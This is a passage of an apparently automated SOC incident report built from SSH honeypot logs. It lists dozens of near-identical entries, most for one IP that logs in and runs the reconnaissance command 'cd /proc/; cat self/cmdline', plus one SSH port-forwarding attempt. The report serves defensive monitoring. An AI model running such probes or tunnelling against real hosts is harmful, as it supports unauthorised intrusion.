| `2026-07-13 11:51:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50668dcf17b9

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:51 |
| **Last Seen** | 2026-07-13 11:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:51:39` | `cowrie.session.connect` |
| `2026-07-13 11:51:39` | `cowrie.login.success` |
| `2026-07-13 11:51:40` | `cowrie.session.params` |
| `2026-07-13 11:51:40` | `cowrie.command.input` |
| `2026-07-13 11:51:49` | `cowrie.log.closed` |
| `2026-07-13 11:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a628600dee9

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:51 |
| **Last Seen** | 2026-07-13 11:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:51:49` | `cowrie.session.connect` |
| `2026-07-13 11:51:49` | `cowrie.login.success` |
| `2026-07-13 11:51:50` | `cowrie.session.params` |
| `2026-07-13 11:51:50` | `cowrie.command.input` |
| `2026-07-13 11:51:59` | `cowrie.log.closed` |
| `2026-07-13 11:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2572b52c374

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:51 |
| **Last Seen** | 2026-07-13 11:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:51:59` | `cowrie.session.connect` |
| `2026-07-13 11:51:59` | `cowrie.login.success` |
| `2026-07-13 11:52:00` | `cowrie.session.params` |
| `2026-07-13 11:52:00` | `cowrie.command.input` |
| `2026-07-13 11:52:09` | `cowrie.log.closed` |
| `2026-07-13 11:52:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9173b5db99c

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:52 |
| **Last Seen** | 2026-07-13 11:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:52:09` | `cowrie.session.connect` |
| `2026-07-13 11:52:10` | `cowrie.login.success` |
| `2026-07-13 11:52:10` | `cowrie.session.params` |
| `2026-07-13 11:52:10` | `cowrie.command.input` |
| `2026-07-13 11:52:19` | `cowrie.log.closed` |
| `2026-07-13 11:52:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a7615c8b9ca

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:52 |
| **Last Seen** | 2026-07-13 11:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:52:20` | `cowrie.session.connect` |
| `2026-07-13 11:52:20` | `cowrie.login.success` |
| `2026-07-13 11:52:20` | `cowrie.session.params` |
| `2026-07-13 11:52:20` | `cowrie.command.input` |
| `2026-07-13 11:52:30` | `cowrie.log.closed` |
| `2026-07-13 11:52:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60b613ea749a

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:52 |
| **Last Seen** | 2026-07-13 11:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:52:30` | `cowrie.session.connect` |
| `2026-07-13 11:52:30` | `cowrie.login.success` |
| `2026-07-13 11:52:30` | `cowrie.session.params` |
| `2026-07-13 11:52:30` | `cowrie.command.input` |
| `2026-07-13 11:52:40` | `cowrie.log.closed` |
| `2026-07-13 11:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87e6c938ffa6

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:52 |
| **Last Seen** | 2026-07-13 11:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:52:40` | `cowrie.session.connect` |
| `2026-07-13 11:52:40` | `cowrie.login.success` |
| `2026-07-13 11:52:40` | `cowrie.session.params` |
| `2026-07-13 11:52:40` | `cowrie.command.input` |
| `2026-07-13 11:52:50` | `cowrie.log.closed` |
| `2026-07-13 11:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25696ad1fc09

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:52 |
| **Last Seen** | 2026-07-13 11:53 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:52:50` | `cowrie.session.connect` |
| `2026-07-13 11:52:50` | `cowrie.login.success` |
| `2026-07-13 11:52:51` | `cowrie.session.params` |
| `2026-07-13 11:52:51` | `cowrie.command.input` |
| `2026-07-13 11:53:00` | `cowrie.log.closed` |
| `2026-07-13 11:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b06930c830ce

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:53 |
| **Last Seen** | 2026-07-13 11:53 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:53:00` | `cowrie.session.connect` |
| `2026-07-13 11:53:00` | `cowrie.login.success` |
| `2026-07-13 11:53:01` | `cowrie.session.params` |
| `2026-07-13 11:53:01` | `cowrie.command.input` |
| `2026-07-13 11:53:10` | `cowrie.log.closed` |
| `2026-07-13 11:53:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0c2f53d267f

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:53 |
| **Last Seen** | 2026-07-13 11:53 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:53:10` | `cowrie.session.connect` |
| `2026-07-13 11:53:10` | `cowrie.login.success` |
| `2026-07-13 11:53:11` | `cowrie.session.params` |
| `2026-07-13 11:53:11` | `cowrie.command.input` |
| `2026-07-13 11:53:20` | `cowrie.log.closed` |
| `2026-07-13 11:53:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ded1bb80724

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:53 |
| **Last Seen** | 2026-07-13 11:53 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:53:20` | `cowrie.session.connect` |
| `2026-07-13 11:53:20` | `cowrie.login.success` |
| `2026-07-13 11:53:21` | `cowrie.session.params` |
| `2026-07-13 11:53:21` | `cowrie.command.input` |
| `2026-07-13 11:53:30` | `cowrie.log.closed` |
| `2026-07-13 11:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf239cc42901

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:53 |
| **Last Seen** | 2026-07-13 11:53 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:53:30` | `cowrie.session.connect` |
| `2026-07-13 11:53:31` | `cowrie.login.success` |
| `2026-07-13 11:53:31` | `cowrie.session.params` |
| `2026-07-13 11:53:31` | `cowrie.command.input` |
| `2026-07-13 11:53:40` | `cowrie.log.closed` |
| `2026-07-13 11:53:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36da08764bbd

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:53 |
| **Last Seen** | 2026-07-13 11:53 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:53:41` | `cowrie.session.connect` |
| `2026-07-13 11:53:41` | `cowrie.login.success` |
| `2026-07-13 11:53:41` | `cowrie.session.params` |
| `2026-07-13 11:53:41` | `cowrie.command.input` |
| `2026-07-13 11:53:51` | `cowrie.log.closed` |
| `2026-07-13 11:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10b12a3e72bd

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:53 |
| **Last Seen** | 2026-07-13 11:54 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:53:51` | `cowrie.session.connect` |
| `2026-07-13 11:53:51` | `cowrie.login.success` |
| `2026-07-13 11:53:52` | `cowrie.session.params` |
| `2026-07-13 11:53:52` | `cowrie.command.input` |
| `2026-07-13 11:54:01` | `cowrie.log.closed` |
| `2026-07-13 11:54:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c709b88ef2f0

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:54 |
| **Last Seen** | 2026-07-13 11:54 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:54:01` | `cowrie.session.connect` |
| `2026-07-13 11:54:01` | `cowrie.login.success` |
| `2026-07-13 11:54:01` | `cowrie.session.params` |
| `2026-07-13 11:54:02` | `cowrie.command.input` |
| `2026-07-13 11:54:11` | `cowrie.log.closed` |
| `2026-07-13 11:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cb0c230102c

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:54 |
| **Last Seen** | 2026-07-13 11:54 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:54:11` | `cowrie.session.connect` |
| `2026-07-13 11:54:11` | `cowrie.login.success` |
| `2026-07-13 11:54:12` | `cowrie.session.params` |
| `2026-07-13 11:54:12` | `cowrie.command.input` |
| `2026-07-13 11:54:21` | `cowrie.log.closed` |
| `2026-07-13 11:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2cf61da00d1

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]41` |
| **First Seen** | 2026-07-13 11:54 |
| **Last Seen** | 2026-07-13 11:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:54:12` | `cowrie.session.connect` |
| `2026-07-13 11:54:12` | `cowrie.client.version` |
| `2026-07-13 11:54:12` | `cowrie.client.kex` |
| `2026-07-13 11:54:13` | `cowrie.login.success` |
| `2026-07-13 11:54:13` | `cowrie.direct-tcpip.request` |
| `2026-07-13 11:54:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aadc24484261

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:54 |
| **Last Seen** | 2026-07-13 11:54 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:54:21` | `cowrie.session.connect` |
| `2026-07-13 11:54:21` | `cowrie.login.success` |
| `2026-07-13 11:54:22` | `cowrie.session.params` |
| `2026-07-13 11:54:22` | `cowrie.command.input` |
| `2026-07-13 11:54:31` | `cowrie.log.closed` |
| `2026-07-13 11:54:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a62dce95100

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:54 |
| **Last Seen** | 2026-07-13 11:54 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:54:31` | `cowrie.session.connect` |
| `2026-07-13 11:54:31` | `cowrie.login.success` |
| `2026-07-13 11:54:32` | `cowrie.session.params` |
| `2026-07-13 11:54:32` | `cowrie.command.input` |
| `2026-07-13 11:54:41` | `cowrie.log.closed` |
| `2026-07-13 11:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f0d1cbade27

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:54 |
| **Last Seen** | 2026-07-13 11:54 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:54:41` | `cowrie.session.connect` |
| `2026-07-13 11:54:41` | `cowrie.login.success` |
| `2026-07-13 11:54:42` | `cowrie.session.params` |
| `2026-07-13 11:54:42` | `cowrie.command.input` |
| `2026-07-13 11:54:51` | `cowrie.log.closed` |
| `2026-07-13 11:54:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf5cd354aee6

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:54 |
| **Last Seen** | 2026-07-13 11:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:54:51` | `cowrie.session.connect` |
| `2026-07-13 11:54:52` | `cowrie.login.success` |
| `2026-07-13 11:54:52` | `cowrie.session.params` |
| `2026-07-13 11:54:52` | `cowrie.command.input` |
| `2026-07-13 11:55:01` | `cowrie.log.closed` |
| `2026-07-13 11:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b6bb6efd2ff

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:55 |
| **Last Seen** | 2026-07-13 11:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:55:01` | `cowrie.session.connect` |
| `2026-07-13 11:55:02` | `cowrie.login.success` |
| `2026-07-13 11:55:02` | `cowrie.session.params` |
| `2026-07-13 11:55:02` | `cowrie.command.input` |
| `2026-07-13 11:55:11` | `cowrie.log.closed` |
| `2026-07-13 11:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1ebf6200164

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:55 |
| **Last Seen** | 2026-07-13 11:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:55:12` | `cowrie.session.connect` |
| `2026-07-13 11:55:12` | `cowrie.login.success` |
| `2026-07-13 11:55:12` | `cowrie.session.params` |
| `2026-07-13 11:55:13` | `cowrie.command.input` |
| `2026-07-13 11:55:22` | `cowrie.log.closed` |
| `2026-07-13 11:55:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fafa4ac17d4

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:55 |
| **Last Seen** | 2026-07-13 11:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:55:22` | `cowrie.session.connect` |
| `2026-07-13 11:55:22` | `cowrie.login.success` |
| `2026-07-13 11:55:22` | `cowrie.session.params` |
| `2026-07-13 11:55:22` | `cowrie.command.input` |
| `2026-07-13 11:55:32` | `cowrie.log.closed` |
| `2026-07-13 11:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63e6f8691f09

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:55 |
| **Last Seen** | 2026-07-13 11:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:55:32` | `cowrie.session.connect` |
| `2026-07-13 11:55:32` | `cowrie.login.success` |
| `2026-07-13 11:55:32` | `cowrie.session.params` |
| `2026-07-13 11:55:33` | `cowrie.command.input` |
| `2026-07-13 11:55:42` | `cowrie.log.closed` |
| `2026-07-13 11:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fd023305df4

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:55 |
| **Last Seen** | 2026-07-13 11:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:55:42` | `cowrie.session.connect` |
| `2026-07-13 11:55:42` | `cowrie.login.success` |
| `2026-07-13 11:55:43` | `cowrie.session.params` |
| `2026-07-13 11:55:43` | `cowrie.command.input` |
| `2026-07-13 11:55:52` | `cowrie.log.closed` |
| `2026-07-13 11:55:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bdb0d3c9c6b

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:55 |
| **Last Seen** | 2026-07-13 11:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:55:52` | `cowrie.session.connect` |
| `2026-07-13 11:55:52` | `cowrie.login.success` |
| `2026-07-13 11:55:53` | `cowrie.session.params` |
| `2026-07-13 11:55:53` | `cowrie.command.input` |
| `2026-07-13 11:56:02` | `cowrie.log.closed` |
| `2026-07-13 11:56:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39fab1e3ae71

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:56 |
| **Last Seen** | 2026-07-13 11:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:56:02` | `cowrie.session.connect` |
| `2026-07-13 11:56:02` | `cowrie.login.success` |
| `2026-07-13 11:56:03` | `cowrie.session.params` |
| `2026-07-13 11:56:03` | `cowrie.command.input` |
| `2026-07-13 11:56:12` | `cowrie.log.closed` |
| `2026-07-13 11:56:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
